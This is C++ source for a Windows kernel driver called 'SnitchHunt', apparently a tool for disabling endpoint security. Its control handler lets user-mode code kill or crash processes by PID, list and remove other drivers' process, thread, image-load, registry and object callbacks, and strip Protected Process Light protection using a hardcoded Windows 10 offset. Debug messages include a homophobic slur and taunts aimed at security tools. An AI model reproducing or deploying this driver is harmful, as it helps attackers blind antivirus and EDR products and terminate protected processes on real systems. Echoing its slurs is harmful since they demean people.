#include "utils.h"

void UnloadMe(PDRIVER_OBJECT);
NTSTATUS DeviceControl(PDEVICE_OBJECT, PIRP);
NTSTATUS CreateClose(PDEVICE_OBJECT, PIRP);
//UINT64 FindKernelBase();
//UINT64 FindProcNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);


// Handle IRP_MJ_CREATE and IRP_MJ_CLOSE
NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}


void UnloadMe(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\SnitchHunt");

    IoDeleteSymbolicLink(&symLink);             // Remove user-mode access path
    IoDeleteDevice(DriverObject->DeviceObject); // Delete the device object

    DbgPrintEx(0, 0, "[%s] Driver has been Unloaded.\n", DRIVER_NAME);
    DbgPrint("Bye Bye fags\n");
}


NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR info = 0;

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;

    switch (controlCode) {
        case IOCTL_KILL_PROCESS:
        {

            ULONG_PTR pidVal = *(ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;
            TermProcess(pidVal);
            break;
        }
        case IOCTL_REM_PROC_CALLBACK:
        {

		    CHAR* moduleToRemove = (CHAR*)Irp->AssociatedIrp.SystemBuffer;
		    int indexToRemove = -1;
            UINT64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }

            ULONG64 procNotifyArrayAddr = FindProcNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!procNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s] Failed to find process notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }

            //procNotifyArrayAddr = *(PULONG64)(procNotifyArrayAddr & 0xfffffffffffffff8);

            DbgPrintEx(0, 0, "[%s] Process Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, procNotifyArrayAddr);

            ModulesData* modules = EnumRegisteredDrivers(procNotifyArrayAddr);

            for (size_t i = 0; i < 64; i++) {
                if (modules[i].ModuleBase == 0)
                    continue;
                if (_stricmp(modules[i].ModuleName, moduleToRemove) == 0) {
                    indexToRemove = (int)i;
                    break;
                }
		    }

            if (indexToRemove == -1) {
                DbgPrintEx(0, 0, "[%s] Module %s not found in process notify routines\n", DRIVER_NAME, moduleToRemove);
                ExFreePool2(modules, DRIVER_TAG, NULL, 0);
                status = STATUS_NOT_FOUND;
                break;
		    }
            DeleteNotifyEntry(procNotifyArrayAddr, indexToRemove);
            // prima ritorno il numero di moduli cosi' che l'user mode allochi il buffer giusto
            //ULONG_PTR* outputBuffer = (ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;
            //SIZE_T neededSize = sizeof(ModulesData) * 64;

            /*DbgPrintEx(0, 0, "Number of valid modules: %llu\n", (unsigned long long)modules.Count);*/

        

            ExFreePool2(modules, DRIVER_TAG, NULL, 0);

            //if (outputBuffer && stack->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(ULONG_PTR)) {
                //*outputBuffer = modules;
                // riempio bytesReturned con la size effettiva
            info = 0;
            status = STATUS_SUCCESS;
            break;
            //}
	    }
        case IOCTL_LIST_PROC_CALLBACK:
        {
            // Placeholder for listing process callbacks
            UINT64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }

            ULONG64 procNotifyArrayAddr = FindProcNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!procNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s] Failed to find process notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }

            //procNotifyArrayAddr = *(PULONG64)(procNotifyArrayAddr & 0xfffffffffffffff8);

            DbgPrintEx(0, 0, "[%s] Process Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, procNotifyArrayAddr);

            ModulesData* modules = EnumRegisteredDrivers(procNotifyArrayAddr);

		    // prima ritorno il numero di moduli cosi' che l'user mode allochi il buffer giusto
		    //ULONG_PTR* outputBuffer = (ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;
            SIZE_T neededSize = sizeof(ModulesData) * 64;

		    /*DbgPrintEx(0, 0, "Number of valid modules: %llu\n", (unsigned long long)modules.Count);*/


		    RtlCopyMemory((ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer, modules, neededSize);

            for (int i = 0; i < 64; i++) {
                if (modules[i].ModuleBase == 0)
                    continue;
                DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: %s at base address 0x%llx\n", DRIVER_NAME, i, modules[i].ModuleName, modules[i].ModuleBase);
            }

		    ExFreePool2(modules, DRIVER_TAG, NULL, 0);

            //if (outputBuffer && stack->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(ULONG_PTR)) {
                //*outputBuffer = modules;
			    // riempio bytesReturned con la size effettiva
		    info = neededSize;
            status = STATUS_SUCCESS;
            break;
            //}
            //else {
            //    status = STATUS_BUFFER_TOO_SMALL;
            //    break;
            //}
            //

            //break;
        }
        case IOCTL_LIST_THREAD_CALLBACK:
        {

		    UINT64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s: LIST_THREAD] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
            }

		    ULONG64 threadNotifyArrayAddr = FindThreadNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!threadNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s: LIST_THREAD] Failed to find thread notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
		    }

		    DbgPrintEx(0, 0, "[%s: LIST_THREAD] Thread Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, threadNotifyArrayAddr);

		    ModulesData* modules = EnumRegisteredDrivers(threadNotifyArrayAddr);


            SIZE_T neededSize = sizeof(ModulesData) * 64;

            RtlCopyMemory((ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer, modules, neededSize);

            for (int i = 0; i < 64; i++) {
                if (modules[i].ModuleBase == 0)
                    break;
                DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: %s at base address 0x%llx\n", DRIVER_NAME, i, modules[i].ModuleName, modules[i].ModuleBase);
            }

            ExFreePool2(modules, DRIVER_TAG, NULL, 0);

            //if (outputBuffer && stack->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(ULONG_PTR)) {
                //*outputBuffer = modules;
                // riempio bytesReturned con la size effettiva
            info = neededSize;
            status = STATUS_SUCCESS;
            break;
        }
        case IOCTL_REM_THREAD_CALLBACK:
        {
            CHAR* moduleToRemove = (CHAR*)Irp->AssociatedIrp.SystemBuffer;
            int indexToRemove = -1;
            UINT64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s: REM_THREAD] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
            }

            ULONG64 threadNotifyArrayAddr = FindThreadNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!threadNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s: REM_THREAD] Failed to find thread notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }

            DbgPrintEx(0, 0, "[%s: REM_THREAD] Thread Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, threadNotifyArrayAddr);

            ModulesData* modules = EnumRegisteredDrivers(threadNotifyArrayAddr);

            for (size_t i = 0; i < 64; i++) {
                if (modules[i].ModuleBase == 0)
                    continue;
                if (_stricmp(modules[i].ModuleName, moduleToRemove) == 0) {
                    indexToRemove = (int)i;
                    break;
                }
            }

            if (indexToRemove == -1) {
                DbgPrintEx(0, 0, "[%s: REM_THREAD] Module %s not found in thread notify routines\n", DRIVER_NAME, moduleToRemove);
                ExFreePool2(modules, DRIVER_TAG, NULL, 0);
                status = STATUS_NOT_FOUND;
                break;
            }
            DeleteNotifyEntry(threadNotifyArrayAddr, indexToRemove);

            ExFreePool2(modules, DRIVER_TAG, NULL, 0);

            //if (outputBuffer && stack->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(ULONG_PTR)) {
                //*outputBuffer = modules;
                // riempio bytesReturned con la size effettiva
            info = 0;
            status = STATUS_SUCCESS;
            break;
            
        }
        case IOCTL_LIST_LOAD_IMAGE_CALLBACK:
        {
			UINT64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s: LIST_LOAD_IMAGE] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            ULONG64 loadImageNotifyArrayAddr = FindLoadImageNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!loadImageNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s: LIST_LOAD_IMAGE] Failed to find load image notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            //procNotifyArrayAddr = *(PULONG64)(procNotifyArrayAddr & 0xfffffffffffffff8);
            DbgPrintEx(0, 0, "[%s: LIST_LOAD_IMAGE] Load Image Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, loadImageNotifyArrayAddr);
            ModulesData* modules = EnumRegisteredDrivers(loadImageNotifyArrayAddr);
            SIZE_T neededSize = sizeof(ModulesData) * 64;
            RtlCopyMemory((ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer, modules, neededSize);
            for (int i = 0; i < 64; i++) {
                if (modules[i].ModuleBase == 0)
                    continue;
                DbgPrintEx(0, 0, "[%s] Load Image Notify Callback %d: %s at base address 0x%llx\n", DRIVER_NAME, i, modules[i].ModuleName, modules[i].ModuleBase);
            }
            ExFreePool2(modules, DRIVER_TAG, NULL, 0);
            info = neededSize;
            status = STATUS_SUCCESS;
			break;
		}
        case IOCTL_REM_LOAD_IMAGE_CALLBACK:
            {
            CHAR* moduleToRemove = (CHAR*)Irp->AssociatedIrp.SystemBuffer;
            int indexToRemove = -1;
            UINT64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s: REM_LOAD_IMAGE] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
            }
            ULONG64 loadImageNotifyArrayAddr = FindLoadImageNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!loadImageNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s: REM_LOAD_IMAGE] Failed to find load image notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            DbgPrintEx(0, 0, "[%s: REM_LOAD_IMAGE] Load Image Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, loadImageNotifyArrayAddr);
            ModulesData* modules = EnumRegisteredDrivers(loadImageNotifyArrayAddr);
            for (size_t i = 0; i < 64; i++) {
                if (modules[i].ModuleBase == 0)
                    continue;
                if (_stricmp(modules[i].ModuleName, moduleToRemove) == 0) {
                    indexToRemove = (int)i;
                    break;
                }
            }
            if (indexToRemove == -1) {
                DbgPrintEx(0, 0, "[%s: REM_LOAD_IMAGE] Module %s not found in load image notify routines\n", DRIVER_NAME, moduleToRemove);
                ExFreePool2(modules, DRIVER_TAG, NULL, 0);
                status = STATUS_NOT_FOUND;
                break;
            }
            DeleteNotifyEntry(loadImageNotifyArrayAddr, indexToRemove);
            ExFreePool2(modules, DRIVER_TAG, NULL, 0);
            info = 0;
            status = STATUS_SUCCESS;
            break;
		}
        case IOCTL_LIST_REG_CALLBACK:
        {
			ULONG64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s: LIST_REG] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            ULONG64 regNotifyArrayAddr = FindRegCallbackNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!regNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s: LIST_REG] Failed to find registry notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            DbgPrintEx(0, 0, "[%s: LIST_REG] Registry Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, regNotifyArrayAddr);

            info = 0;
			status = STATUS_SUCCESS;
		}
        case IOCTL_REM_REG_CALLBACK:
        {
            
            ULONG64 kernelBase = FindKernelBase();
            if (!kernelBase) {
                DbgPrintEx(0, 0, "[%s: LIST_REG] Failed to find kernel base\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            ULONG64 regNotifyArrayAddr = FindRegCallbackNotifyRoutineAddress(kernelBase, ImageLoadCallback);
            if (!regNotifyArrayAddr) {
                DbgPrintEx(0, 0, "[%s: LIST_REG] Failed to find registry notify routine address\n", DRIVER_NAME);
                status = STATUS_UNSUCCESSFUL;
                break;
            }
            //procNotifyArrayAddr = *(PULONG64)(procNotifyArrayAddr & 0xfffffffffffffff8);
            DbgPrintEx(0, 0, "[%s: LIST_REG] Registry Notify Routine Array Address: 0x%llx\n", DRIVER_NAME, regNotifyArrayAddr);
			status = DeleteRegCallbackEntry(regNotifyArrayAddr);
            info = 0;
            break;
        }
        case IOCTL_REM_OBJ_CALLBACK:
        {
			RemObjCallbackNotifyRoutineAddress();
        }
        case IOCTL_CRASH_PROCESS:
        {
            ULONG_PTR pidVal = *(ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;
            status = crashProcess(pidVal);
            break;
		}
        case IOCTL_PPL_BYPASS:
        {
            DWORD pidVal = *(DWORD*)Irp->AssociatedIrp.SystemBuffer;
            //int offset = *(int*)((ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer + 1);
			int offset = 0x5fa; // Windows 10 22H2 x64 offset
            status = pplBypass(pidVal, offset);
            if (!NT_SUCCESS(status)) {
                DbgPrintEx(0, 0, "[%s] Failed to bypass PPL for PID %lu\n", DRIVER_NAME, (unsigned long)pidVal);
            }
            else {
                DbgPrintEx(0, 0, "[%s] Successfully bypassed PPL for PID %lu\n", DRIVER_NAME, (unsigned long)pidVal);
			}
            break;
		}
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_WARNING_LEVEL,
                "[%s] Invalid IOCTL 0x%08X\n", DRIVER_NAME, controlCode);
            break;

    }
    // Complete the IRP
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info; // bytes returned (0 here)
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
    
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	
	UNREFERENCED_PARAMETER(RegistryPath);

	DbgPrintEx(0, 0, "[%s] SnitchHunter started hunting snitches. Callback on deez nutz loosers\n", DRIVER_NAME);


	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;

	// Unload Function
	DriverObject->DriverUnload = UnloadMe;


	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\SnitchHunt");

	PDEVICE_OBJECT DeviceObject;

	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&devName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "[%s] Failed to create device (0x%X)\n", DRIVER_NAME, status);
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\SnitchHunt");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(DeviceObject);
		DbgPrintEx(0, 0, "[%s] Failed to create symbolic link (0x%X)\n", DRIVER_NAME, status);
		return status;
	}

	return STATUS_SUCCESS;
}
